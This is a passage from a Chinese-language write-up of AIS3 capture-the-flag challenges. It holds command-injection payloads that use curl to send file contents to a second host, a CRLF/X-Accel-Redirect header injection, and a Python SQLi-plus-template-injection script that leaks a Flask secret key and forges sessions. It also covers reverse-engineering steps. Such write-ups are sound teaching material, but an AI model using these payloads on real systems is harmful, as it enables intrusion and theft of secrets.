tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl http://10.105.0.21:21520/ -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;name=example.$(curl 10.105.2.22 -d \u0026#34;$(ls /)\u0026#34;)\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl http://10.105.0.21:21520/ -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;name=example.$(curl 10.105.2.22 -d \u0026#34;$(cat /flag_SWeUMks9hGYFciax)\u0026#34;)\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl http://10.105.0.21:21520/ -d \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;name=example.$(curl 10.105.2.22 -d \u0026#34;$(cat /$(echo f)lag_SWeUMks9hGYFciax)\u0026#34;)\u0026#39;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"flag-1\"\u003eFlag\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/481aad11-e682-4ccc-8333-a8f3f62d337e\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{jUsT_3@$y_cOMmAnD_INJEc7ION}\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"internal\"\u003eInternal\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/f5f445de-3668-4e00-b166-197c29c0f198\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"解題-1\"\u003e解題\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/4f4b8f77-aeb2-4264-86d7-7371e96bd6e8\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e看 code ，似乎是 url 帶 \u003ccode\u003eredir\u003c/code\u003e 參數會被 rediract 到後面的 url\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/cec7b2f9-4786-4c07-b5b4-3c24602f507b\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/59104540-6328-463e-a368-52dab72ef472\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003epath 用 \u003ccode\u003e/flag\u003c/code\u003e 會被 nginx 擋，所以可能要繞過 nginx 取得後端的 \u003ccode\u003e/flag\u003c/code\u003e api\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/8c81a610-7658-40f6-9514-174c9139ecfe\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e仔細看，這邊似乎有 CRLF 的問題（regex 遇到換行會無效，只檢查到換行前）\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/58448297-53f1-4488-8e9c-1b21be1f22f7\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e所以我們可以任意更改 response 的 header 或 content。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/8b4b39fd-e7a3-4bc2-9fa8-730c299e3086\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/85ee4998-a99b-4813-9154-df2fd940fa03\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e參考這個 \u003ca href=\"https://nginx.org/en/docs/http/ngx_http_core_module.html#internal\"\u003enginx doc internal\u003c/a\u003e，我們可以增加 \u003ccode\u003eX-Accel-Redirect\u003c/code\u003e header 讓 nginx 收到這個 response 時從 nginx 改成回傳 \u003ccode\u003e/flag\u003c/code\u003e api 的內容。\u003c/p\u003e\n\u003ch4 id=\"exploit-1\"\u003eexploit\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003ecurl -vvv \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e$1\u003cspan style=\"color:#e6db74\"\u003e?redir=\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e$(\u003c/span\u003eurlencode \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;https://google.com\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#e6db74\"\u003eX-Accel-Redirect: /flag\u0026#34;\u003c/span\u003e\u003cspan style=\"color:#66d9ef\"\u003e)\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"flag-2\"\u003eFlag\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/bdc8499e-b765-4b59-9e68-f5462358f2a8\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{jU$T_sOM3_funNy_N91Nx_FEatur3}\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"copypasta\"\u003ecopypasta\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/4f6a587e-65c5-4e5c-b98f-39a21297138e\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"解題-2\"\u003e解題\u003c/h4\u003e\n\u003cp\u003e一個複製文產生器\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/139b1d1d-0ed3-4e37-9bf4-9c07b78e4aa9\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e他會保存所有人在這個網頁生成的文章，裡面有一個文章含有 flag，我們要把牠撈出來。\u003c/p\u003e\n\u003cp\u003e但是兩個問題\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e沒有該文章的 ID\u003c/li\u003e\n\u003cli\u003e如果 session 裡面沒有該文章的 ID 他會 permission denied\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/c2c6746f-9e88-423f-a357-89e8b23ad2ee\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e發現這邊有 \u003ccode\u003eSQLi\u003c/code\u003e 的漏洞\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/e65933f5-7d76-4ba1-9db6-186afdc4fd24\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e這邊還有 \u003ccode\u003eSSTI\u003c/code\u003e 的漏洞\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a61b6ac4-0832-4066-be55-877c9acf7630\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e因此思路會是：\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003e用 SQLi 生成一個帶有 SSTI payload 的模板並生成文章\u003c/li\u003e\n\u003cli\u003e利用這個文章的 SSTI 把 session 的 \u003ccode\u003esecret_key\u003c/code\u003e leak 出來\u003c/li\u003e\n\u003cli\u003e用 SQLi 生成一個模板，裡面有 flag page id 的資料\u003c/li\u003e\n\u003cli\u003e用 leak 出來 的 \u003ccode\u003esecret_key\u003c/code\u003e 修改 session\u003c/li\u003e\n\u003cli\u003e讀取 flag page\u003c/li\u003e\n\u003c/ol\u003e\n\u003cp\u003e於是構建出 SSTI payload \u003ccode\u003efield.__init__.__globals__[http]._dt_as_utc.__globals__[sys].modules[flask].current_app.secret_key\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e然後搭配 SQLi 得到這個 payload \u003ccode\u003e union SELECT 0 as id, 'ans' as title, '{field.__init__.__globals__[http]._dt_as_utc.__globals__[sys].modules[flask].current_app.secret_key}' as template\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e還有 dump flag page id 的 SQLi payload \u003ccode\u003e union SELECT id, id as title, id as template from copypasta where orig_id=3\u003c/code\u003e\u003c/p\u003e\n\u003ch4 id=\"exploit-2\"\u003eexploit\u003c/h4\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" style=\"color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;\"\u003e\u003ccode class=\"language-python\" data-lang=\"python\"\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e requests\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e sys\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e urllib.parse\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e hashlib\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e bs4 \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e BeautifulSoup\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e flask.json.tag \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e TaggedJSONSerializer\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#f92672\"\u003efrom\u003c/span\u003e itsdangerous \u003cspan style=\"color:#f92672\"\u003eimport\u003c/span\u003e \u003cspan style=\"color:#f92672\"\u003e*\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esession \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e requests\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esession()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esqli \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; union SELECT 0 as id, \u0026#39;ans\u0026#39; as title, \u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{field.__init__.__globals__[http]._dt_as_utc.__globals__[sys].modules[flask].current_app.secret_key}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39; as template\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esession\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eget(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003esys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e session\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003epost(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003esys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/use?id=0\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eurllib\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eparse\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003equote(sqli, safe\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e)\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e, params\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e{\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;a\u0026#39;\u003c/span\u003e})\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003etext\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esecret_key \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e BeautifulSoup(data, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;html.parser\u0026#34;\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003earticle\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eget_text()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;secret_key: \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003esecret_key\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esqli \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#34; union SELECT id, id as title, id as template from copypasta where orig_id=3\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003edata \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e session\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eget(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003esys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/use?id=0\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eurllib\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eparse\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003equote(sqli, safe\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#34;\u0026#34;\u003c/span\u003e)\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003etext\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eflagid \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e BeautifulSoup(data, \u003cspan style=\"color:#e6db74\"\u003e\u0026#34;html.parser\u0026#34;\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003epre\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eget_text()\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;flagid: \u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eflagid\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\u003cspan style=\"color:#66d9ef\"\u003efor\u003c/span\u003e a \u003cspan style=\"color:#f92672\"\u003ein\u003c/span\u003e session\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ecookies:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e    \u003cspan style=\"color:#66d9ef\"\u003eif\u003c/span\u003e a\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ename \u003cspan style=\"color:#f92672\"\u003e==\u003c/span\u003e \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;session\u0026#39;\u003c/span\u003e:\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        nowsession \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e a\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e        \u003cspan style=\"color:#66d9ef\"\u003ebreak\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eserializer \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e URLSafeTimedSerializer(secret_key\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003esecret_key,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                  salt\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;cookie-session\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                  serializer\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003eTaggedJSONSerializer(),\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                  signer_kwargs\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e{\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                      \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;key_derivation\u0026#39;\u003c/span\u003e: \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;hmac\u0026#39;\u003c/span\u003e,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                      \u003cspan style=\"color:#e6db74\"\u003e\u0026#39;digest_method\u0026#39;\u003c/span\u003e: hashlib\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003esha1,\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e                  })\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esessiondata \u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003e serializer\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eloads(nowsession\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003evalue)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esessiondata[\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;posts\u0026#39;\u003c/span\u003e]\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eappend(flagid)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003esession\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ecookies\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eset(nowsession\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003ename, serializer\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edumps(sessiondata), domain\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003enowsession\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003edomain, path\u003cspan style=\"color:#f92672\"\u003e=\u003c/span\u003enowsession\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003epath)\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan style=\"display:flex;\"\u003e\u003cspan\u003eprint(session\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eget(\u003cspan style=\"color:#e6db74\"\u003ef\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003esys\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003eargv[\u003cspan style=\"color:#ae81ff\"\u003e1\u003c/span\u003e]\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e/view/\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e{\u003c/span\u003eflagid\u003cspan style=\"color:#e6db74\"\u003e}\u003c/span\u003e\u003cspan style=\"color:#e6db74\"\u003e\u0026#39;\u003c/span\u003e)\u003cspan style=\"color:#f92672\"\u003e.\u003c/span\u003etext)\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003ch4 id=\"flag-3\"\u003eFlag\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a4b2e738-1171-4938-abc6-14c7857e024a\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{I_l0Ve_P@$tA_@ND_cOpypasta}\u003c/code\u003e\u003c/p\u003e\n\u003ch2 id=\"reverse\"\u003eReverse\u003c/h2\u003e\n\u003ch3 id=\"flag-generator\"\u003eFlag Generator\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/3be03d23-4734-4307-b379-b51690a44d1b\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"解題-3\"\u003e解題\u003c/h4\u003e\n\u003cp\u003e一個 windows 執行檔\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/fdfa9179-addf-465f-b358-407aa4e23c28\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e執行以後他會生成另一個 \u003ccode\u003eflag.exe\u003c/code\u003e 執行檔，但是不知道為甚麼生成的檔案是空的。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/b2311bde-983d-4ad6-a2ec-5112cc766946\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003eIDA 打開來看到他會執行 \u003ccode\u003ewriteFile\u003c/code\u003e function 來寫 \u003ccode\u003eflag.exe\u003c/code\u003e 檔案\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/4917b70a-c2d3-41ce-94be-3bf3ab333118\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e但是這個 \u003ccode\u003ewriteFile\u003c/code\u003e 裡面沒有寫寫檔的程式，只有印一串字串到 stdout。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a69d73b7-91b7-41d5-8dba-694a577d6807\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/76eb0156-8f7e-4b83-9e2e-fe9713fb4f61\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e所以需要 patch 一下，把一些不需要的拿掉，然後把 \u003ccode\u003efwrite\u003c/code\u003e 改成對這個檔案作用，而不是 \u003ccode\u003estdout\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/a1565aae-96d6-4ca3-9fe7-fa67a538764e\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/aae51b36-d1e1-4e62-9c73-acda4d7f4f49\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/16695a9f-44e0-4359-8d88-f5db9bfac5d0\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e成功生成 \u003ccode\u003eflag.exe\u003c/code\u003e 以後執行就拿到 flag 了\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/66292f23-80bf-489c-b735-8c9b7d149017\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"flag-4\"\u003eFlag\u003c/h4\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/0ef9cb8c-9212-4a25-8a5f-e2e74ed83127\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003ccode\u003eAIS3{Us1n9_WINd0w5_I$_suCh_@_p@1N....}\u003c/code\u003e\u003c/p\u003e\n\u003ch3 id=\"stateful\"\u003eStateful\u003c/h3\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/6e785309-6170-49fc-9714-773494905188\" alt=\"image\"\u003e\u003c/p\u003e\n\u003ch4 id=\"解題-4\"\u003e解題\u003c/h4\u003e\n\u003cp\u003e他是一個 linux ELF 執行檔\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/3cbe0887-c8f5-4deb-81cd-a9db1934a7d2\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e執行後直接噴 \u003ccode\u003eWRONG!!!\u003c/code\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/45672138-30f9-4aa2-9fdb-1bfc8458ad8d\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e似乎執行時要輸入一個長度為 43 的字串參數，應該是 flag，這個字串會經過 \u003ccode\u003estate_machine\u003c/code\u003e function 運算後跟 \u003ccode\u003ek_target\u003c/code\u003e 裡的資料一個一個做比對。\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/ba46bbd0-0178-4bb9-9ada-cd8c3a15d4ea\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/fe1e25b7-1250-4702-8e97-b66f05fa000d\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e\u003cimg src=\"https://github.com/Jimmy01240397/CTF-writeup/assets/57281249/fe6d21e3-06f3-4066-a609-ff1ab19b485e\" alt=\"image\"\u003e\u003c/p\u003e\n\u003cp\u003e把 